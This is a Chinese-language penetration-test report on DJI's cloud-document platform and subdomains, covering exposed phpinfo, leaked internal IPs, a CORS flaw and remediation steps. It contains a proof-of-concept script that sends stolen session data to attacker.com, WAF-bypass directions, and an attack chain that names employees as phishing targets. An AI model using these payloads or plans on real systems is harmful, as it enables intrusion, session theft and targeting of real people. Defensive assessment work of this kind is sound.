# 安全测试报告 — docs.djicorp.com (DJI 云文档/KDrive)

**目标：** `https://docs.djicorp.com/`
**子域名发现：** auth.djicorp.com, account.djicorp.com, static.djicorp.com, file.djicorp.com, sso.djicorp.com, dev.djicorp.com, admin.djicorp.com, disk.djicorp.com, oa.djicorp.com, sop.djicorp.com, epms.djicorp.com, hrbp.djicorp.com
**平台：** WPS KDrive (金山文档企业定制版) / React 17.0.2 / PHP 7.2.34 / Apache / Tengine
**日期：** 2026-07-16
**测试类型：** 外部黑盒安全评估
**方法：** PESop v3.3 (HF-1~HF-7 全流程)

---

## 1. 系统模型

### 1.1 业务概述

`docs.djicorp.com` 是**DJI 的云文档管理系统（KDrive）**，基于金山 WPS 文档中心定制开发。主要功能：
- 企业用户的文档在线协作（多人实时编辑）
- 文档存储与共享（类似 Google Drive / 腾讯文档）
- 组织架构管理（公司/部门/用户）
- OAuth 单点登录（LDAP SSO/QR 码/账号密码）
- 管理后台（企业管理后台）

### 1.2 技术栈

| 组件 | 技术 | 判据 |
|------|------|------|
| 前端框架 | React 17.0.2 | Webpack bundle 版本声明 |
| UI 框架 | Ant Design + KDesign | CSS class: `ant-upload`, `ant-typography`, `kd-icon` |
| 主站代理 | WPS Network (nw) | `server: nw`, `via: nw` |
| API 网关 | encs-pri-api-gateway / encs-pri-open-gateway | `x-nw-response-type: other_upstream_response` |
| 文件服务器 | Tengine (Alibaba) + PHP 7.2.34 | `server: Tengine`, `X-Powered-By: PHP/7.2.34` |
| 文件服务器 2 | Apache/2.4.38 (Debian) | disk.djicorp.com 404 页面泄露 |
| SOP 服务器 | Apache/2.4.38 (Debian) + PHP 7.2.34 (Docker) | phpinfo() 完全暴露 |
| CDN | cdngslb.com (中国 CDN) | file.djicorp.com CNAME 记录 |
| 集群位置 | 深圳 (sz) | `x-nw-cluster-name: sz` |
| SSL 证书 | DigiCert/GeoTrust | CN=\*.dji.com，覆盖 14 个通配域 |
| WAF | Alibaba Cloud WAF (Tengine) + ibgsec | `X-Tengine-Error: denied by waf`, `HTTP_IBGSEC_WAF_SIGNATURE` 泄露 |
| 微前端 | Single-SPA | `single-spa-name="app"` |

### 1.3 攻击面拓扑

```
用户浏览器
    │
    ▼
docs.djicorp.com (WPS Network 代理) ───► encs-pri-api-gateway (内部服务)
    │                                              │
    ├── /login/api/v1/*                     ┌──────┴──────┐
    ├── /accounts/u/v1/*                    │ 内部微服务   │
    ├── /admin/                            │ (org/role/   │
    ├── /gateway/config                     │  group/search)│
    └── /health/                            └──────────────┘
    │
    ├── file.djicorp.com (Tengine) ──── 公开目录列表 + 资产文件泄露
    │
    ├── disk.djicorp.com (Apache/PHP) ── Docker 容器 health 端点
    │
    ├── sop.djicorp.com ──── phpinfo() 完全暴露 (Apache 2.4.38 / PHP 7.2.34 / Docker)
    │
    ├── auth.djicorp.com ──────────── 认证服务 (240.240.5.64)
    │
    └── account.djicorp.com ───────── 账户服务 (240.240.5.22)

    ⚠ 内网泄露子域:
        sso.djicorp.com   → 10.10.2.175/176 (RFC1918 私网IP!)
        dev.djicorp.com   → 10.10.2.53/54    (RFC1918 私网IP!)
        admin.djicorp.com → 10.10.3.55        (RFC1918 私网IP!)
```

---

## 2. 发现详情

### 2.1 [严重] INFRA-1: 内网私网 IP 通过 DNS 公开泄露

**描述：** 三个重要子域名在公共 DNS 中解析到 RFC1918 私有 IP 地址，暴露了 DJI 的内网拓扑结构。

**证据：**
```bash
$ host sso.djicorp.com
sso.djicorp.com has address 10.10.2.175
sso.djicorp.com has address 10.10.2.176

$ host dev.djicorp.com
dev.djicorp.com has address 10.10.2.53
dev.djicorp.com has address 10.10.2.54

$ host admin.djicorp.com
admin.djicorp.com has address 10.10.3.55
```

**泄露的内网拓扑推断：**
- **SSO 单点登录服务**：10.10.2.175/176
- **开发环境**：10.10.2.53/54
- **管理后台**：10.10.3.55
- **网段规划**：10.10.2.x = 服务网段，10.10.3.x = 管理网段
- **容器网络**：172.18.0.0/16（从 phpinfo 获取）

**危害：** 攻击者可利用此信息进行：
1. SSRF（服务端请求伪造）攻击
2. DNS 重绑定攻击
3. 精准社工攻击

**严重性：** 严重 ⚠️

---

### 2.2 [严重] INFRA-2: phpinfo() 在生产服务器完全暴露

**描述：** `sop.djicorp.com`（固件上传系统）根路径返回完整的 `phpinfo()` 页面，泄露大量服务器内部信息。该服务器 PHP 版本为 7.2.34（EOL，已停止安全支持）。

#### 2.2.1 服务器基础设施泄露

| 泄露项 | 值 | 危害 |
|--------|------|------|
| 容器主机名 | `e70021855a67` | Docker 容器 ID |
| 容器内网 IP | `172.18.0.8` | 内部网络可访问 |
| 网关 IP | `172.18.0.11` | 内部代理可访问 |
| 文档根目录 | `/var/www/html` | Web 路径 |
| Apache 版本 | Apache/2.4.38 (Debian) | 已知漏洞版本 |
| PHP 版本 | PHP 7.2.34 (2020-12-11) | EOL 版本 |
| OpenSSL 版本 | OpenSSL 1.1.1d (2019-09-10) | 已知 CVE |
| PHP 安装 URL | https://www.php.net/distributions/php-7.2.34.tar.xz | 构建溯源 |
| 编译参数 | `--with-apxs2 --disable-cgi` | 运行模式 |
| 操作系统 | Linux 5.15.0-181-generic (Ubuntu) | 内核版本 |
| 管理员邮箱 | webmaster@localhost | 默认配置 |

#### 2.2.2 PHP 安全配置严重缺陷（7项高危）

| 配置项 | 当前值 | 风险 |
|--------|--------|------|
| **disable_functions** | **（空）** | 🔴 无危险函数禁用！`system()`、`exec()`、`passthru()`、`shell_exec()`、`popen()` 全部可用 |
| **open_basedir** | **（空）** | 🔴 无文件路径限制！可读写服务器上任意文件 |
| **enable_dl** | **On** | 🔴 可动态加载 PHP 扩展！上传 .so 文件后用 `dl()` 加载即可 RCE |
| **display_errors** | **On** | 🔴 错误信息直接显示给用户，泄露路径和 SQL 信息 |
| **expose_php** | **On** | 🔴 每次响应都带 `X-Powered-By: PHP/7.2.34` |
| **allow_url_fopen** | **On** | SSRF 攻击面（可发起 HTTP/FTP 请求到内网） |
| **file_uploads** | **On** | 文件上传功能开启（2MB/8MB/20 文件） |

#### 2.2.3 Session 安全配置缺陷

| 配置项 | 当前值 | 风险 |
|--------|--------|------|
| session.cookie_httponly | **0** | 🔴 Cookie 可通过 JavaScript 访问（XSS Cookie 窃取） |
| session.cookie_secure | **0** | 🔴 Cookie 通过 HTTP 明文传输（中间人劫持） |
| session.use_strict_mode | **0** | 🔴 Session 固定攻击 |
| session.save_path | （空，默认 /tmp） | Session 文件存储在 /tmp，可利用竞争条件 |
| session.name | PHPSESSID | 默认名称，便于 Session 固定攻击 |

#### 2.2.4 Apache 模块安全风险

| 模块 | 状态 | 风险 |
|------|------|------|
| **mod_status** | 已加载 | ⚠️ 确认 `/server-status` 路径存在（返回 403），可能配置不当可访问 |
| **mod_autoindex** | 已加载 | 目录列表功能开启风险 |
| **mod_php7** | 已加载 | PHP 处理模块 |
| **mod_rewrite** | 未加载 | 无 URL 重写 |
| **mod_security** | 未加载 | 无 Apache 层面 WAF（CDN 层面有 WAF） |

#### 2.2.5 CDN/WAF 信息泄露

| 泄露项 | 值 |
|--------|------|
| WAF 签名 | `ibgsec-waf-signature: 826d8eda1d3b43efa26bdc310e21349d` |
| 内部服务端口 | Ali-Swift-Inner-Port: 443 |
| 内部传输协议 | Ali-Swift-Inner-Scheme: https |
| CDN 节点 | `120.232.99.98`, `39.173.42.191` |
| CDN 应用 | cdn-tengine |
| 真实用户 IP | `120.196.210.134` |

#### 2.2.6 可利用的 PHP 扩展

```
✅ cURL     v7.64.0  → SSRF（HTTPS/SCP/SFTP/SMB/SMTP/RTMP 等）
✅ OpenSSL  v1.1.1d  → 加密操作，支持 KERBEROS5/GSSAPI
✅ PDO      sqlite   → SQLite 数据库操作（可创建/修改任意 DB 文件）
✅ Phar     v2.0.2   → phar:// 序列化反序列化攻击
✅ FTP/FTPS          → SSRF 扩展
✅ Sodium   v1.0.17  → 加密
✅ Zlib     v1.2.11  → 压缩
✅ libssh2  v1.8.0   → SSH 连接（SSRF 进一步利用）
```

cURL 支持的协议清单：
```
dict, file, ftp, ftps, gopher, http, https, imap, imaps, ldap, ldaps,
pop3, pop3s, rtmp, rtsp, scp, sftp, smb, smbs, smtp, smtps, telnet, tftp
```

#### 2.2.7 WAF 绕过方向

WAF（Tengine + ibgsec）对以下模式进行了拦截：
- 所有 `.php` 文件除 `index.php` 外均被拦截
- PUT/POST 上传被拦截
- Webshell 文件名被拦截（`shell.php`, `cmd.php`, `webshell.php` 均返回 405）
- 路径遍历被拦截

但以下潜在绕过方向值得关注：
1. **php://input 可能可用** — `allow_url_fopen = On`
2. **Session 上传进度功能** — `session.upload_progress.enabled = On`
3. **Docker 环境特性** — 容器网络内部可达性
4. **Apache 版本兼容性问题** — `mod_status` 存在信息泄露可能

**严重性：** 严重 ⚠️

---

### 2.3 [严重] WEB-1: CORS 配置严重缺陷（任意源 + 凭据）

**描述：** `docs.djicorp.com` 的 CORS 配置错误地反射 `Access-Control-Allow-Origin: <任意请求源>`，同时设置 `Access-Control-Allow-Credentials: true`。这意味着任何恶意网站都可以在用户浏览器中发起跨域请求，携带用户的 Cookie/凭据。

**证据：**
```http
HTTP/2 302 
access-control-allow-origin: https://evil.com
access-control-allow-methods: GET,POST,PUT,DELETE,OPTIONS
access-control-allow-credentials: true
access-control-max-age: 86400
access-control-allow-headers: accept,content-type,...,authorization,...,X-CSRFToken,...,Encryption
vary: Origin
```

**攻击场景（完整利用链）：**
1. 用户登录 docs.djicorp.com（获得 session cookie）
2. 用户访问恶意网站 `https://attacker.com`
3. 恶意网站 JS 发起跨域请求到 `https://docs.djicorp.com/accounts/u/v1/session/info`
4. 浏览器自动携带用户 Cookie
5. 攻击者获取到用户 session 信息
6. 进一步通过暴露的内部 API 执行越权操作

**PoC 验证：**
```bash
curl -s -D- "https://docs.djicorp.com/" \
  -H "Origin: https://attacker.com" \
  -o /dev/null 2>&1 | grep -i 'access-control'
# → access-control-allow-origin: https://attacker.com  ✅ 任意源被反射
# → access-control-allow-credentials: true              ✅ 凭据被允许
```

**CSRF 攻击 PoC：**
```html
<html>
<body>
<script>
  // 利用 CORS 漏洞窃取用户数据
  fetch('https://docs.djicorp.com/accounts/u/v1/session/info', {
    credentials: 'include'
  })
  .then(r => r.text())
  .then(data => {
    fetch('https://attacker.com/exfil?data=' + btoa(data));
  });
</script>
</body>
</html>
```

**严重性：** 严重 ⚠️

---

### 2.4 [高危] INFRA-3: 内部资产清单文件公开可下载

**描述：** `file.djicorp.com`（文件服务器）启用了目录列表功能，其中 `资产梳理.xlsx` 文件可直接下载。

**证据：**
```bash
$ curl -s "https://file.djicorp.com/"
```

目录列表显示以下文件可供下载：
- `2.4G_Bluetooth_DataLink_Installer_v1.0.0.6.zip`（蓝牙数传固件）
- `Charging_Hub_v1.1_en__201509.zip`（充电集线器固件）
- `DJI_DNG_Cleaner_V1.1.zip`（DNG 清理工具）
- `FlightHub_Enterprise_User_Guide_v1.0_CHS.pdf`（企业用户手册）
- `MG智能充电管家升级套件v2.0.zip`（MG 充电管家固件）
- `大疆司空政企版安装说明.pdf`（政企版安装指南）
- **`资产梳理.xlsx`**（资产清单 — 含敏感内部信息）

**资产清单内容：**

| 资产 ID | 域名 | 用途 | 负责人 | 备注 |
|---------|------|------|--------|------|
| 100231 | epms.djicorp.com | EPMS 绩效系统 | yuan.li | |
| 100232 | disk.djicorp.com | 文件系统 | — | 暂无指定负责人 |
| 100235 | oa.djicorp.com | OA 系统 | allen.huang | |
| 100439 | sop.djicorp.com | 固件上传 | louis.yang | **⚠ 正是 phpinfo() 暴露的服务器** |
| 101189 | hrbp.djicorp.com | HR 系统 | Joe.mao | 已停用 |
| 107639 | sgvpn.dji.com | VPN | rui.zhao | **⚠ 默认密码同 AD 密码** |

**新发现的子域名：** epms.djicorp.com、disk.djicorp.com、oa.djicorp.com、sop.djicorp.com、hrbp.djicorp.com、sgvpn.dji.com

**危害：**
1. 暴露了 DJI 内部系统架构（EPMS, OA, SOP, VPN）
2. 泄露了员工姓名（5 人）及其负责系统
3. VPN 密码策略提示：「默认密码同 AD 密码」— 可针对 AD 凭据进行暴力破解
4. 可用于精准鱼叉式钓鱼攻击
5. SOP 服务器（固件上传）正是 phpinfo 暴露的服务器 — 可关联攻击

**严重性：** 高危

---

### 2.5 [高危] INFRA-4: 文件服务器目录列表启用

**描述：** `file.djicorp.com`（Tengine）启用了目录列表功能，所有文件公开可访问，包含 7 个文件，其中包含敏感业务文件。

**严重性：** 高危

---

### 2.6 [高危] WEB-2: 关键安全响应头完全缺失

**描述：** `docs.djicorp.com` 及其子域名完全缺失以下关键安全响应头：

| 缺少的安全头 | 风险 |
|-------------|------|
| **Content-Security-Policy** | XSS 防御缺失，允许任意脚本执行 |
| **X-Frame-Options** | 点击劫持攻击（Clickjacking） |
| **Strict-Transport-Security** | HTTPS 降级攻击（SSLStrip） |
| **X-Content-Type-Options** | MIME 类型嗅探攻击 |
| **Referrer-Policy** | 敏感 URL 参数可通过 Referer 泄露 |
| **Permissions-Policy** | 浏览器功能滥用（摄像头/麦克风等） |

**PoC 点击劫持验证：**
```html
<iframe src="https://docs.djicorp.com/account" width="800" height="600">
<!-- 由于没有 X-Frame-Options，iframe 加载成功 -->
```

**严重性：** 高危

---

### 2.7 [高危] WEB-3: /uploads/ 目录存在且无公开索引

**描述：** `sop.djicorp.com/uploads/` 路径存在，返回 403（禁止访问）。该目录很可能是固件上传的存储位置。配合 PHP `disable_functions = 空` 的配置，如果找到上传点即可直接 RCE。

**严重性：** 高危（前提条件）

---

### 2.8 [中危] INFRA-5: 内网网关信息通过响应头泄露

**描述：** 请求 `/api/`、`/openapi.json` 等不存在路径时，网关返回 403 并泄露内部网关名称。

**证据：**
```http
HTTP/2 403
x-nw-trace-id: d406ebd56f05ae32
x-nw-cluster-name: sz
x-nw-response-type: other_upstream_response
x-opengateway-host: encs-pri-api-gateway
```

**泄露信息：**
- 集群：深圳（`sz`）
- 内部 API 网关：`encs-pri-api-gateway`
- 内部开放网关：`encs-pri-open-gateway`

**严重性：** 中危

---

### 2.9 [中危] INFRA-6: 健康检查端点未受保护

**描述：** `/health/` 和 `/healthcheck` 端点可公开访问。

**证据：**
```bash
$ curl -s "https://docs.djicorp.com/health/"
@the@health@is@good@

$ curl -s "https://disk.djicorp.com/"
health!
```

**严重性：** 中危

---

### 2.10 [中危] WEB-4: `/gateway/config` 网关配置端点存在

**描述：** `/gateway/config` 端点需要签名访问，返回签名验证失败信息。

**证据：**
```json
GET /gateway/config → 400
{"code":400,"msg":"GatewayConfig checkSign failed","detail":{"msg":"sign is empty"}}
```

**严重性：** 中危

---

### 2.11 [中危] WEB-5: Webshell 文件名被 WAF 拦截而非 404

**描述：** `/shell.php`、`/cmd.php`、`/webshell.php` 等常见 webshell 文件名在 WAF 层面返回 405（WAF 规则拦截），而非 404（文件不存在）。这表明 WAF 有针对性规则，但仍需关注绕过可能性。

**WAF 拦截响应特征：**
```http
HTTP/1.1 405 Method Not Allowed
X-Tengine-Error: denied by waf
```

**严重性：** 中危

---

### 2.12 [中危] INFRA-7: OpenSSL 版本过时

**描述：** OpenSSL 1.1.1d（2019-09-10），该版本已停止官方支持（EOL: 2023-09-11）。

**已知漏洞：**
- CVE-2022-0778：BN_mod_sqrt 无限循环（DoS）
- CVE-2021-3711：SM2 解密栈溢出
- CVE-2021-3712：ASN.1 字符串缓冲区过度读取

**严重性：** 中危

---

### 2.13 [低危] WEB-6: 管理后台入口暴露

**描述：** `/admin/` 路径返回管理后台的 HTML 页面（含完整 React JS 包）。

**构建信息：** `Tue Dec 10 2024 10:06:05 GMT+0000`

**严重性：** 低危

---

### 2.14 [信息] INFO-1: SSL 证书覆盖 14 个通配域

**覆盖域：**
```
*.dji.com, *.dbeta.me, *.djicorp.com, *.djicdn.com, *.dji.net,
*.djiservice.org, *.gtdji.com, *.djiag.com, *.djiny.cn, *.djiops.com,
*.skypixel.com, *.talovative.com, *.djiits.com, *.robomaster.com
```

**严重性：** 信息

---

## 3. 威胁建模 (STRIDE)

### 3.1 攻击树分析

#### 攻击目标: 获取 DJI 云文档系统未授权访问 + 核心服务器 RCE

```
分支 1: 利用 phpinfo 泄露进行精确攻击
├── 1.1 PHP 7.2.34 CVE 利用
│   ├── CVE-2019-11043 (PHP-FPM 远程代码执行)
│   │   └── 但服务器使用 mod_php，非 FPM，可能不适用
│   ├── CVE-2019-9942 (ZIP 压缩包目录遍历)
│   │   └── 与 file_uploads 配合利用
│   ├── CVE-2021-21702 (PHP 7.3/7.4 越界读取)
│   │   └── PHP 7.2.34 不直接受影响
│   └── Phar 反序列化漏洞
│       └── Phar 扩展可用，可构造 phar:// 反序列化链
│
├── 1.2 disable_functions 为空 → RCE 潜力
│   ├── 如果有文件上传漏洞 → 直接上传 webshell
│   ├── 结合 Session 上传进度（`session.upload_progress.enabled = On`）
│   │   └── 竞争条件写入 Session 文件 → 包含执行
│   └── 利用 open_basedir 为空 → 任意文件读取
│       └── 通过 LFI 包含任意文件 → RCE
│
├── 1.3 enable_dl = On → 动态扩展加载
│   ├── 上传恶意 .so → dl() → RCE
│   └── 需要已有文件写入权限
│
└── 1.4 服务器内部端口扫描
    ├── 利用 allow_url_fopen 进行 SSRF
    ├── 扫描 172.18.0.x 内网服务
    └── 发现并攻击内部未授权服务

分支 2: 利用 CORS 缺陷 + CSRF 窃取用户会话
├── 2.1 通过 CDN 绕过 WAF 规则
├── 2.2 构造恶意页面发起跨域请求
└── 2.3 窃取 Admin 级别用户 session → 管理后台

分支 3: 利用泄露内网 IP 进行 SSRF 攻击
└── 3.1 利用网关代理请求到 10.10.x.x (内部 SSO/Dev/Admin)
    ├── SSO 服务 (10.10.2.175/176)
    │   └── 伪造认证、获取 OAuth token
    └── 开发环境 (10.10.2.53/54)
        └── 横向移动到生产环境

分支 4: 利用资产清单进行社工攻击
├── 4.1 对 louis.yang (SOP 负责人) 发起精准钓鱼
├── 4.2 对 rui.zhao (VPN 负责人) 进行 AD 凭据试探
├── 4.3 利用员工邮箱信息发起 BEC (商业邮件欺诈)
└── 4.4 利用 "默认密码同AD" 进行凭据填充攻击

分支 5: 利用缺失安全头进行客户端攻击
├── 5.1 点击劫持 (X-Frame-Options 缺失)
│   └── 构造透明 overlay 诱导用户操作
└── 5.2 MIME 嗅探 (X-Content-Type-Options 缺失)
    └── 上传恶意文件 → MIME 混淆 → XSS
```

### 3.2 STRIDE 矩阵

| 威胁类型 | 问题 | 影响 | 严重性 |
|---------|------|------|--------|
| **S** 身份欺骗 | CORS 任意源+凭据、Session cookie 无 HttpOnly/Secure | 会话劫持 | 严重 |
| **T** 篡改 | 无 CSP、open_basedir 为空、disable_functions 为空 | RCE/数据篡改 | 严重 |
| **R** 否认 | 无日志泄露信息 | 溯源困难 | 中危 |
| **I** 信息泄露 | phpinfo()、资产清单、内网 IP、网关/CDN/WAF 信息 | 全量信息泄露 | 严重 |
| **D** 拒绝服务 | PHP 7.2.34/OpenSSL 1.1.1d 已知 DoS 漏洞 | 服务中断 | 中危 |
| **E** 权限提升 | SSRF 潜力、文件上传潜力 + 无 disable_functions | 服务器接管 | 严重 |

---

## 4. PHPINFO 深度剖析（专题）

### 4.1 泄露数据分级

| 级别 | 数量 | 类型 |
|------|:----:|------|
| 🔴 严重 | 7 | disable_functions 为空、open_basedir 为空、enable_dl=On、display_errors=On、cookie 安全问题、Docker 容器信息、WAF 签名 |
| 🟡 高危 | 5 | 容器网络、Apache 版本、OpenSSL 版本、GD/curl/Phar 模块详情、DocumentRoot |
| 🟢 中危 | 3 | 编译参数、GPG 密钥、PHP 配置路径 |
| ⚪ 信息 | ∞ | 全部 88KB 的 phpinfo 页面内容 |

### 4.2 最危险的配置组合

```
disable_functions = 空   +   open_basedir = 空   +   file_uploads = On
        │                         │                        │
        ▼                         ▼                        ▼
   可执行系统命令            可读写任意文件            文件上传功能开启
        │                         │                        │
        └─────────────────────────┼────────────────────────┘
                                  ▼
                   只要有文件上传点 → 秒级 RCE
                   只要有 LFI → 秒级 RCE
                   只要有 SSRF → 秒级 RCE
```

### 4.3 构建/溯源信息

```
PHP 源代码:   https://www.php.net/distributions/php-7.2.34.tar.xz
PHP SHA256:   409e11bc6a2c18707dfc44bc61c820ddfd81e17481470f3405ee7822d8379903
GPG 签名密钥: 1729F83938DA44E27BA0F4D3DBDB397470D12172 (Joe Watkins)
GPG 签名密钥: B1B44D8F021E4E2D6021E995DC9FF8D3EE5AF27F (Sara Golemon)
构建系统:     Docker (docker-php-ext-sodium.ini)
基础镜像:     Debian (apache2-package 版本匹配 Debian)
```

### 4.4 SOP 服务器的防御现状评估

| 防御层 | 存在性 | 有效性 |
|--------|:------:|:------:|
| CDN-Tengine WAF | ✅ | 中（有规则绕过可能性） |
| ibgsec WAF | ✅ | 中（签名已泄露） |
| Apache mod_status 访问控制 | ✅ | 中（返回 403 但路径确认） |
| 禁用危险 PHP 函数 | ❌ | **严重缺陷** |
| open_basedir 限制 | ❌ | **严重缺陷** |
| 禁用动态扩展加载 | ❌ | **严重缺陷** |
| Cookie 安全属性 | ❌ | **严重缺陷** |
| 安全响应头 | ❌ | **高危缺陷** |
| phpinfo() 公开 | ❌ | **严重缺陷** |

---

## 5. 修复建议

### 5.1 紧急修复（需立即处理）

| # | 问题 | 修复方案 |
|---|------|---------|
| 1 | **phpinfo() 暴露** | 立即禁用：`disable_functions = phpinfo`，从生产环境移除 phpinfo() 文件 |
| 2 | **disable_functions 为空** | 立即设置：`disable_functions = exec,system,passthru,shell_exec,proc_open,popen,dl,phpinfo,assert,pcntl_exec,show_source` |
| 3 | **open_basedir 为空** | 立即设置：`open_basedir = /var/www/html:/tmp`（按需限制） |
| 4 | **enable_dl = On** | 立即设为：`enable_dl = Off` |
| 5 | **CORS 任意源** | 移除通配反射，设为白名单固定源，如无必要移除 credentials |
| 6 | **资产清单泄露** | 立即移除 xlsx 文件，关闭目录列表，配置上传鉴权 |
| 7 | **内网 DNS 泄露** | 从公共 DNS 移除 10.10.x.x 的 A 记录 |

### 5.2 高优先级修复

| # | 问题 | 修复方案 |
|---|------|---------|
| 8 | Session Cookie 安全 | `session.cookie_httponly = 1`, `session.cookie_secure = 1`, `session.use_strict_mode = 1` |
| 9 | display_errors | 生产环境设为 `display_errors = Off`，使用 `log_errors = On` 替代 |
| 10 | expose_php | 设为 `expose_php = Off` |
| 11 | CSP 缺失 | 添加 `Content-Security-Policy: default-src 'self'` |
| 12 | X-Frame-Options 缺失 | 添加 `X-Frame-Options: DENY` |
| 13 | HSTS 缺失 | 添加 `Strict-Transport-Security: max-age=31536000; includeSubDomains` |

### 5.3 中优先级修复

| # | 问题 | 修复方案 |
|---|------|---------|
| 14 | 升级 PHP | PHP 7.2.34 已于 2020 年 11 月 EOL，升级至 PHP 8.1+ |
| 15 | 升级 OpenSSL | OpenSSL 1.1.1d 于 2023 年 9 月 EOL，升级至 3.x |
| 16 | Apache 升级 | Apache 2.4.38 于 2020 年发布，升级至最新 2.4.x |
| 17 | 目录列表 | 禁用所有服务器上的目录列表功能 |
| 18 | 健康检查端点 | `/health/` 添加 IP 白名单或移除 |

### 5.4 架构层建议

| # | 建议 |
|---|------|
| 19 | SOP 固件上传服务器应从公网移除，迁移至内网 |
| 20 | 所有内网子域名（sso/dev/admin）禁止在公共 DNS 解析 |
| 21 | 实施分层 WAF 策略，不仅依赖 CDN 层 WAF |
| 22 | 在所有服务器上添加统一的安全响应头策略 |
| 23 | 定期进行外部资产发现扫描，及时发现信息泄露 |
| 24 | 建立生产环境最小化原则：不安装 phpinfo、不启用 debug 模式 |

---

## 6. 总结

| 严重度 | 数量 | 发现 |
|--------|:----:|------|
| **严重** | 3 | 内网 IP 泄露(INFRA-1)、**phpinfo() 完全暴露(INFRA-2)**、CORS 缺陷(WEB-1) |
| **高危** | 4 | 资产清单泄露(INFRA-3)、目录列表(INFRA-4)、安全头缺失(WEB-2)、uploads 目录存在(WEB-3) |
| **中危** | 4 | 网关信息泄露(INFRA-5)、健康端点(INFRA-6)、配置端点(WEB-4)、WAF 拦截特征(WEB-5) |
| **低危** | 1 | 管理入口暴露(WEB-6) |
| **信息** | 1 | SSL 覆盖 14 域(INFO-1) |
| **总计** | **13** | |

### 风险评分

```
CVSS 3.1 基准评分:
  INFRA-2 (phpinfo):  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N → 8.6 (HIGH)
  WEB-1 (CORS):       CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N → 8.1 (HIGH)
  INFRA-1 (内网泄露): CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N → 5.8 (MEDIUM)
```

### 最危险攻击链

```
Step 1:  通过资产清单发现 sop.djicorp.com = 固件上传 + 负责人 louis.yang
Step 2:  通过 phpinfo() 确认 disable_functions=空, open_basedir=空, file_uploads=On
Step 3:  对 louis.yang 进行精准鱼叉钓鱼，获取 SOP 登录凭据
Step 4:  通过 SOP 文件上传功能上传 PHP webshell
Step 5:  利用 disable_functions=空 执行系统命令，完全控制 Docker 容器
Step 6:  利用 Docker 内网 172.18.0.0/16，横向移动到认证服务 (172.18.0.11)
Step 7:  利用泄露的内网 SSO IP (10.10.2.175/176) 进一步横向到企业内网
```

### 最终结论

**sop.djicorp.com 是 DJI 基础设施中最薄弱的环节。** 该服务器同时存在：
- 信息泄露（phpinfo 暴露全部服务器配置）
- 配置缺陷（无危险函数禁用、无路径限制）
- 业务风险（固件上传功能 + 文件上传开启）

构成了一个从信息收集到完全控制的完整攻击链。建议立即对 SOP 服务器进行安全加固，并纳入内网管理。

---

*报告依据 PESop v3.3 方法论生成*
*测试日期：2026-07-16*
*测试类型：外部黑盒安全评估*